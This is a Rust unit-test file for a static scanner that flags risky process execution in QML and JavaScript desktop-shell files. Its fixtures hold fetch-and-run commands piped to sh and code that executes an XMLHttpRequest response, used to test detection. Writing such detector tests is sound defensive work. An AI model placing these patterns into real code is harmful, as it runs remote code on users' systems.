use crate::detect::*;
use omasafe_core::bounds::TimeBudget;

#[expect(dead_code, reason = "used by the fallback-build test only")]
fn one_file_inventory(relative: &str, kind: PayloadKind, size: usize) -> PayloadInventory {
    let mut inventory = PayloadInventory::default();
    inventory.entries.push(PayloadEntry {
        relative_path: relative.to_owned(),
        kind,
        mode: 0o644,
        size: size as u64,
        sha256_sampled: None,
        sampled_digest: false,
        executable: false,
        coverage_state: CoverageState::Unsupported,
        link_target: None,
        invocation_target: false,
        object_id: None,
    });
    inventory
}

pub(crate) fn analyze_with(
    mut inventory: PayloadInventory,
    contents: &[(&str, &[u8])],
) -> (AnalysisArtifacts, PayloadInventory) {
    let lookup: std::collections::HashMap<&str, &[u8]> = contents
        .iter()
        .map(|(path, bytes)| (*path, *bytes))
        .collect();
    let artifacts = analyze_inventory(
        &mut inventory,
        &|entry| {
            lookup
                .get(entry.relative_path.as_str())
                .map(|bytes| bytes.to_vec())
        },
        &TimeBudget::default(),
    );
    (artifacts, inventory)
}

#[test]
fn static_benign_process_is_capability_only() {
    let source = r#"
import Quickshell.Io
Process { command: ["notify-send", "hello"] }
"#;
    let mut inventory = PayloadInventory::default();
    inventory.entries.push(PayloadEntry {
        relative_path: "Main.qml".to_owned(),
        kind: PayloadKind::Qml,
        mode: 0o644,
        size: source.len() as u64,
        sha256_sampled: None,
        sampled_digest: false,
        executable: false,
        coverage_state: CoverageState::Unsupported,
        link_target: None,
        invocation_target: false,
        object_id: None,
    });
    let artifacts = analyze_inventory(
        &mut inventory,
        &|_| Some(source.as_bytes().to_vec()),
        &TimeBudget::default(),
    );
    assert!(
        artifacts.results.is_empty(),
        "benign argv must not be a finding"
    );
    assert_eq!(
        inventory.entries[0].coverage_state,
        CoverageState::Analyzed,
        "capability observation counts as analysis output"
    );
    assert!(
        artifacts
            .capabilities
            .iter()
            .any(|capability| capability.capability == "process-execution")
    );
}

#[test]
fn shell_chain_argv_is_a_finding() {
    let source = "Process { command: [\"sh\", \"-c\", \"curl example.test | sh\"] }\n";
    let mut inventory = PayloadInventory::default();
    inventory.entries.push(PayloadEntry {
        relative_path: "Evil.qml".to_owned(),
        kind: PayloadKind::Qml,
        mode: 0o644,
        size: source.len() as u64,
        sha256_sampled: None,
        sampled_digest: false,
        executable: false,
        coverage_state: CoverageState::Unsupported,
        link_target: None,
        invocation_target: false,
        object_id: None,
    });
    let artifacts = analyze_inventory(
        &mut inventory,
        &|_| Some(source.as_bytes().to_vec()),
        &TimeBudget::default(),
    );
    let rendered = artifacts.rendered_findings();
    assert_eq!(rendered.len(), 1);
    assert_eq!(rendered[0].rule_id, PROCESS_RULE);
    assert_eq!(rendered[0].severity, "medium");
    assert!(
        rendered[0]
            .evidence
            .starts_with("shell-interpreter-command:")
    );
    assert_eq!(inventory.entries[0].coverage_state, CoverageState::Analyzed);
}

#[test]
fn dynamic_identifier_binding_is_capability_only() {
    let source = "Process { id: p; command: commandFromNetwork }\n";
    let mut inventory = PayloadInventory::default();
    inventory.entries.push(PayloadEntry {
        relative_path: "Dyn.qml".to_owned(),
        kind: PayloadKind::Qml,
        mode: 0o644,
        size: source.len() as u64,
        sha256_sampled: None,
        sampled_digest: false,
        executable: false,
        coverage_state: CoverageState::Unsupported,
        link_target: None,
        invocation_target: false,
        object_id: None,
    });
    let artifacts = analyze_inventory(
        &mut inventory,
        &|_| Some(source.as_bytes().to_vec()),
        &TimeBudget::default(),
    );
    // A bare identifier has no visible suspicious provenance; the ability
    // is recorded, never a finding (rule contract).
    assert!(artifacts.rendered_findings().is_empty());
    assert!(
        artifacts
            .capabilities
            .iter()
            .any(|capability| capability.capability == "process-execution")
    );
}

#[test]
fn quoted_slashes_survive_but_comments_do_not() {
    // A quoted URL before a live command must not hide it, and a
    // commented-out call must never become a finding.
    let js_source = r#"var url = "https://example.test/a";
execDetached("echo ok"); // execDetached("sh -c curl evil | sh")
"#;
    let mut inventory = PayloadInventory::default();
    inventory.entries.push(PayloadEntry {
        relative_path: "Comments.js".to_owned(),
        kind: PayloadKind::JavaScript,
        mode: 0o644,
        size: js_source.len() as u64,
        sha256_sampled: None,
        sampled_digest: false,
        executable: false,
        coverage_state: CoverageState::Unsupported,
        link_target: None,
        invocation_target: false,
        object_id: None,
    });
    let artifacts = analyze_inventory(
        &mut inventory,
        &|_| Some(js_source.as_bytes().to_vec()),
        &TimeBudget::default(),
    );
    assert!(
        artifacts.rendered_findings().is_empty(),
        "commented chains are invisible; quoted URLs are inert: {:?}",
        artifacts.rendered_findings()
    );

    // Same line: a quoted URL must not hide a LIVE command binding that
    // follows it, even with a trailing comment after it.
    let js_same_line = "var u = \"https://example.test/a\"; Process { command: [\"sh\", \"-c\", \"curl evil | sh\"] } // tail\n";
    let mut same_line_inventory = PayloadInventory::default();
    same_line_inventory.entries.push(PayloadEntry {
        relative_path: "SameLine.js".to_owned(),
        kind: PayloadKind::JavaScript,
        mode: 0o644,
        size: js_same_line.len() as u64,
        sha256_sampled: None,
        sampled_digest: false,
        executable: false,
        coverage_state: CoverageState::Unsupported,
        link_target: None,
        invocation_target: false,
        object_id: None,
    });
    let same_line_artifacts = analyze_inventory(
        &mut same_line_inventory,
        &|_| Some(js_same_line.as_bytes().to_vec()),
        &TimeBudget::default(),
    );
    let same_line_findings = same_line_artifacts.rendered_findings();
    assert_eq!(same_line_findings.len(), 1, "{same_line_findings:?}");
    assert!(
        same_line_findings[0]
            .evidence
            .starts_with("shell-interpreter-command:")
    );

    // Same shape as above, but the second call is LIVE: the finding
    // survives the earlier quoted URL and the trailing comment.
    let js_live = r#"var url = "https://example.test/a";
Process { command: "notify" }; execDetached(xhr.responseText) // note
"#;
    let mut live_inventory = PayloadInventory::default();
    live_inventory.entries.push(PayloadEntry {
        relative_path: "Live.js".to_owned(),
        kind: PayloadKind::JavaScript,
        mode: 0o644,
        size: js_live.len() as u64,
        sha256_sampled: None,
        sampled_digest: false,
        executable: false,
        coverage_state: CoverageState::Unsupported,
        link_target: None,
        invocation_target: false,
        object_id: None,
    });
    let live_artifacts = analyze_inventory(
        &mut live_inventory,
        &|_| Some(js_live.as_bytes().to_vec()),
        &TimeBudget::default(),
    );
    let findings = live_artifacts.rendered_findings();
    assert_eq!(findings.len(), 1, "{findings:?}");
    assert_eq!(findings[0].evidence, "network-response-executed");
}

#[test]
fn later_suspicious_execdetached_on_one_line_is_not_masked() {
    // A benign first call must not suppress the suspicious second one,
    // even when they share a line inside a real handler body.
    let source = r#"Item {
    Component.onCompleted: {
        Quickshell.execDetached("echo ok"); Quickshell.execDetached(xhr.responseText)
    }
}
"#;
    let mut inventory = PayloadInventory::default();
    inventory.entries.push(PayloadEntry {
        relative_path: "Mask.qml".to_owned(),
        kind: PayloadKind::Qml,
        mode: 0o644,
        size: source.len() as u64,
        sha256_sampled: None,
        sampled_digest: false,
        executable: false,
        coverage_state: CoverageState::Unsupported,
        link_target: None,
        invocation_target: false,
        object_id: None,
    });
    let artifacts = analyze_inventory(
        &mut inventory,
        &|_| Some(source.as_bytes().to_vec()),
        &TimeBudget::default(),
    );
    let findings = artifacts.rendered_findings();
    assert_eq!(findings.len(), 1, "{findings:?}");
    assert_eq!(findings[0].rule_id, DETACHED_RULE);
    assert_eq!(findings[0].evidence, "network-response-executed");
}

#[test]
fn comments_never_feed_lexical_provenance() {
    let source = "Process { command: \"notify-send hi\" } // sh -c curl evil | sh\n";
    let mut inventory = PayloadInventory::default();
    inventory.entries.push(PayloadEntry {
        relative_path: "Comment.qml".to_owned(),
        kind: PayloadKind::Qml,
        mode: 0o644,
        size: source.len() as u64,
        sha256_sampled: None,
        sampled_digest: false,
        executable: false,
        coverage_state: CoverageState::Unsupported,
        link_target: None,
        invocation_target: false,
        object_id: None,
    });
    let artifacts = analyze_inventory(
        &mut inventory,
        &|_| Some(source.as_bytes().to_vec()),
        &TimeBudget::default(),
    );
    assert!(
        artifacts.rendered_findings().is_empty(),
        "commented-out chains are not provenance: {:?}",
        artifacts.rendered_findings()
    );
}

#[test]
fn dynamic_identifier_binding_is_capability_only_lexical_parity() {
    // Lexical builds additionally cannot even see the flow; both must
    // agree that a bare identifier is never a finding.
    let source = "Process { id: p; command: commandFromNetwork }\n";
    let mut inventory = PayloadInventory::default();
    inventory.entries.push(PayloadEntry {
        relative_path: "Dyn.qml".to_owned(),
        kind: PayloadKind::Qml,
        mode: 0o644,
        size: source.len() as u64,
        sha256_sampled: None,
        sampled_digest: false,
        executable: false,
        coverage_state: CoverageState::Unsupported,
        link_target: None,
        invocation_target: false,
        object_id: None,
    });
    let artifacts = analyze_inventory(
        &mut inventory,
        &|_| Some(source.as_bytes().to_vec()),
        &TimeBudget::default(),
    );
    assert!(
        artifacts
            .capabilities
            .iter()
            .any(|capability| capability.capability == "process-execution")
    );
    assert!(artifacts.rendered_findings().is_empty());
}

#[cfg(feature = "qml-parser")]
#[test]
fn network_response_reaching_execution_is_a_finding() {
    let source = r#"Item {
    Component.onCompleted: {
        var xhr = new XMLHttpRequest()
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) Quickshell.execDetached(xhr.responseText)
        }
    }
}
"#;
    let mut inventory = PayloadInventory::default();
    inventory.entries.push(PayloadEntry {
        relative_path: "Chain.qml".to_owned(),
        kind: PayloadKind::Qml,
        mode: 0o644,
        size: source.len() as u64,
        sha256_sampled: None,
        sampled_digest: false,
        executable: false,
        coverage_state: CoverageState::Unsupported,
        link_target: None,
        invocation_target: false,
        object_id: None,
    });
    let artifacts = analyze_inventory(
        &mut inventory,
        &|_| Some(source.as_bytes().to_vec()),
        &TimeBudget::default(),
    );
    let rendered = artifacts.rendered_findings();
    assert_eq!(rendered.len(), 1, "{rendered:?}");
    assert_eq!(rendered[0].rule_id, DETACHED_RULE);
    assert_eq!(rendered[0].evidence, "network-response-executed");
}

#[cfg(feature = "qml-parser")]
#[test]
fn unrelated_network_and_execution_never_form_a_finding() {
    let source = r#"Item {
    Timer { onTriggered: statusText.text = "tick" }
    Process { command: ["notify-send", "done"] }
    Text { text: {
        var xhr = new XMLHttpRequest()
        xhr.open("GET", "https://example.test/api")
        xhr.send()
    } }
}
"#;
    let mut inventory = PayloadInventory::default();
    inventory.entries.push(PayloadEntry {
        relative_path: "Calm2.qml".to_owned(),
        kind: PayloadKind::Qml,
        mode: 0o644,
        size: source.len() as u64,
        sha256_sampled: None,
        sampled_digest: false,
        executable: false,
        coverage_state: CoverageState::Unsupported,
        link_target: None,
        invocation_target: false,
        object_id: None,
    });
    let artifacts = analyze_inventory(
        &mut inventory,
        &|_| Some(source.as_bytes().to_vec()),
        &TimeBudget::default(),
    );
    assert!(
        artifacts.rendered_findings().is_empty(),
        "co-occurrence without data flow must stay capability-only: {:?}",
        artifacts.rendered_findings()
    );
    let kinds: Vec<&str> = artifacts
        .capabilities
        .iter()
        .map(|capability| capability.capability.as_str())
        .collect();
    assert!(kinds.contains(&"network-access"));
    assert!(kinds.contains(&"process-execution"));
    // Capability records carry their covering-rule contract.
    for capability in &artifacts.capabilities {
        assert!(capability.source_rule_id.is_some(), "{capability:?}");
        assert!(!capability.explanation.is_empty());
        assert!(!capability.review_guidance.is_empty());
    }
}

#[cfg(feature = "qml-parser")]
#[test]
fn computed_loader_source_is_an_explicit_low_confidence_finding() {
    let source = r#"Item {
    Loader { source: root.dynamicPath }
}
"#;
    let mut inventory = PayloadInventory::default();
    inventory.entries.push(PayloadEntry {
        relative_path: "DynRef.qml".to_owned(),
        kind: PayloadKind::Qml,
        mode: 0o644,
        size: source.len() as u64,
        sha256_sampled: None,
        sampled_digest: false,
        executable: false,
        coverage_state: CoverageState::Unsupported,
        link_target: None,
        invocation_target: false,
        object_id: None,
    });
    let artifacts = analyze_inventory(
        &mut inventory,
        &|_| Some(source.as_bytes().to_vec()),
        &TimeBudget::default(),
    );
    let rendered = artifacts.rendered_findings();
    assert_eq!(rendered.len(), 1, "{rendered:?}");
    assert_eq!(rendered[0].rule_id, DYNAMIC_REFERENCE_RULE);
    assert_eq!(rendered[0].severity, "low");
    assert_eq!(rendered[0].confidence.as_deref(), Some("ast-backed"));
    assert!(
        rendered[0]
            .evidence
            .starts_with("dynamic-reference-sink:Loader.source")
    );
}
